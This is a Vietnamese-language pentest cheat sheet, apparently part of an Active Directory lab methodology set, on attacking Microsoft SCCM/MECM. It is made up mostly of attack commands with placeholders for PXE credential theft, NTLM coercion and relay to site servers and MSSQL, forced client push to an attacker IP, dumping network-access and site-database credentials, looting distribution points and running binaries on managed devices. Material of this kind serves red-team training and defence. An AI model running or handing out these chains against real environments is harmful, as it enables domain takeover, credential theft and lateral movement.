# 10 — SCCM / MECM Exploitation

**SCCM** (System Center Configuration Manager) quản lý triển khai máy trạm trong
doanh nghiệp. Mindmap v2025.03 có nguyên một nhánh lớn, chia theo mục tiêu:
**Recon → Creds → Elevate → Takeover → Exec → Post-exploit**. Thường gặp trong
lab AD nâng cao / môi trường enterprise.

Thuật ngữ: **MP** = Management Point, **DP** = Distribution Point, **NAA** =
Network Access Account, **site server/site DB**.

---

## A. Recon

> **Khi nào:** có creds domain; nghi ngờ có SCCM.

```bash
ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> sccm      # tìm SCCM trong AD
sccmhunter.py find -u <user> -p <password> -d <domain> -dc-ip <dc_ip> -debug
sccmhunter.py show -all
nxc smb <sccm_server> -u <user> -p <password> -d <domain> --shares
```

```powershell
SharpSCCM.exe local site-info          # thông tin site (chạy trên máy có client SCCM)
```

- **Kết quả:** vị trí MP/DP/site server, site code.

---

## B. Creds-1: No credentials — PXE

> **Khi nào:** chưa có creds; PXE boot bật. Xem [file 01 §I](01-no-credentials.md).

```bash
pxethief.py 1 ; pxethief.py 2 <dp_ip> ; pxethief.py 5 '\xxx\boot.var'
```

- **Kết quả:** box **"PXE Hash"** (`$sccm$aes128$…`, crack `-m 19850`) / credential.

---

## C. Elevate (user thường → quyền trên site system)

> **Tại sao:** ép site server/client coerce về attacker rồi relay → chiếm site system.

```bash
# Elevate-1: Relay on site systems (simple user)
coerce sccm site server → ntlmrelayx.py -tf <site_systems> -smb2support
# Elevate-2: Force client push (simple user)
ntlmrelayx.py -t <sccm_server> -smb2support -socks           # listen
SharpSCCM.exe invoke client-push -mp <sccm_server>.<domain> -sc <site_code> -t <attacker_ip>
proxychains smbexec.py -no-pass <domain>/<socks_user>@<sccm_server>
# Elevate-3: Automatic client push (tạo DNS A record cho máy không tồn tại, enroll, chờ client push)
dnstool.py -u '<domain>\<user>' -p <pass> -r <newcomputer>.<domain> -a add -t A -d <attacker_ip> <dc_ip>
setspn -D host/<newcomputer> <newcomputer>                   # xoá SPN để tránh trùng
ntlmrelayx.py -tf <no_signing_target> -smb2support -socks    # chờ ~5m client push → relay
```

- **Kết quả:** box **"Admin on Site system"**.

---

## D. Takeover (relay tới MSSQL của SCCM → SCCM admin)

> **Khi nào:** SCCM MSSQL ≠ SCCM server; coerce được.

```bash
# Takeover-1: relay to mssql db
sccmhunter.py mssql -u <user> -p <password> -d <domain> -dc-ip <dc_ip> -debug -tu <target_user> -sc <site_code> -stacked
coerce sccm_mssql → ntlmrelayx.py -smb2support -ts -t mssql://<sccm_mssql> -q "<query>"
sccmhunter.py admin -u <target_user>@<domain> -p '<password>' -ip <sccm_ip>     # → SCCM ADMIN
# Takeover-2: relay to mssql server (simple user)
ntlmrelayx.py -t <sccm_mssql> -smb2support -socks
coerce sccm_server → proxychains smbexec.py -no-pass <domain>/'<sccm_server>$'@<sccm_ip>   # → Admin MSSQL
```

- **Kết quả:** box **"SCCM ADMIN" / "Admin MSSQL"**.

---

## E. Creds: lấy credential từ SCCM

```bash
# Creds-2: Policy Request Credentials (simple user) — thêm computer, xin policy
sccmwtf.py newcomputer newcomputer.<domain> <target> '<domain>\<computer_added>$' '<computer_pass>'
policysecretunobfuscate.py       # giải NAA username/password
SCCMSecrets.py policies -mp http://<management_point> -u '<machine_account>$' -p '<machine_password>' -cn '<client_name>'
# Creds (NAA) qua SharpSCCM
SharpSCCM.exe get secrets -r newcomputer -u <computer_added>$ -p <computer_pass>
SharpSCCM.exe local secrets -m disk
SharpSCCM.exe local secrets -m wmi
# Creds-5: SCCM admin → site DB credentials
secretsdump.py <domain>/<admin>:'<pass>'@<sccm_target>
mssqlclient.py -windows-auth -hashes '<sccm_target_hashNT>' '<domain>/<sccm_target>$'@<sccm_mssql>
use CM_<site_code>; SELECT * FROM SC_UserAccount;        # đọc tài khoản trong DB
sccmdecryptpoc.exe <cyphered_value>                       # giải mã giá trị
# DPAPI/loot
dploot.py sccm -u <admin> -p '<password>' <sccm_target>
sccmhunter.py dpapi -u <admin> -p '<password>' -target <sccm_target> -debug
```

- **Kết quả:** box **"NAA credentials" / "User + Pass" / "Site DB credentials"** →
  dùng creds mới quay lại file 03.

---

## F. Loot files trên DP

```bash
cmloot.py <domain>/<user>:<password>@<sccm_dp> -cmlootinventory sccmfiles.txt   # SMB (445)
SCCMSecrets.py files -dp http://<distribution_point> -u '<user>' -p '<password>' # HTTP (80/443)
sccm-http-looter -server <ip_dp>
```

- **Kết quả:** box **"CRED-6 Loot creds"** — file triển khai chứa credential.

---

## G. Exec (SCCM admin → chạy lệnh trên máy target)

```bash
SharpSCCM.exe get devices -sms <SMS_PROVIDER> -sc <SITECODE> -n <NTLMRELAYX_LISTENER_IP>
SharpSCCM.exe exec -p <binary> -d <device_name> -sms <SMS_PROVIDER> -sc <SITECODE> --no-banner
SharpSCCM.exe remove device GUID:<GUID>       # cleanup
```

- **Kết quả:** box **"EXEC-1/2 SCCM admin lat"** — thực thi trên thiết bị quản lý.

---

## H. Post-exploit (BloodHound cho SCCM)

```bash
SCCMHound.exe --server <server> --sitecode <sitecode>      # thu dữ liệu SCCM cho BloodHound
```

```cypher
MATCH p=(u:Base)-[:SQLAdmin]->(c:Computer) RETURN p         # user/máy là SQL admin
```

---

## Checklist SCCM

- [ ] Recon: sccmhunter find / ldeep sccm
- [ ] Không creds + PXE → pxethief
- [ ] Elevate: client push / relay site system
- [ ] Takeover: relay tới MSSQL → SCCM admin
- [ ] Creds: NAA (sccmwtf/SharpSCCM) / site DB / DPAPI
- [ ] Loot DP (cmloot/http-looter)
- [ ] Exec qua SharpSCCM → lan ngang
- [ ] Dọn dẹp device giả đã tạo
